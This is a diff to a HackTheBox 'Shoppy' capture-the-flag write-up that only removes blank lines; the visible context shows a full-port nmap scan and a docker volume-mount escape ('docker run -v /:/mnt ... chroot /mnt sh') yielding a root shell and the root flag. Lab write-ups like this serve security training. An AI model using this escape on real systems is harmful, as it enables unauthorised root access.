@@ -20,7 +20,6 @@ Shoppy is an easy Linux machine that features a website with a login panel and a
 ## Nmap
 
 ```bash
-
 # Nmap 7.93 scan initiated Thu Jan 12 05:25:32 2023 as: nmap -sV -sC -Pn -T4 -p- -oA shoppy shoppy.htb                                                         
 Nmap scan report for shoppy.htb (10.10.11.180)                                                                                                                 
 Host is up (0.19s latency).                                                                                                                                    
@@ -335,10 +334,8 @@ https://gtfobins.github.io/gtfobins/docker/
 
 ```bash
 deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-
 # id
 uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
-
 # cat /root/root.txt
 c3e748b6e9f646db850edb0defa3fe08
 ```
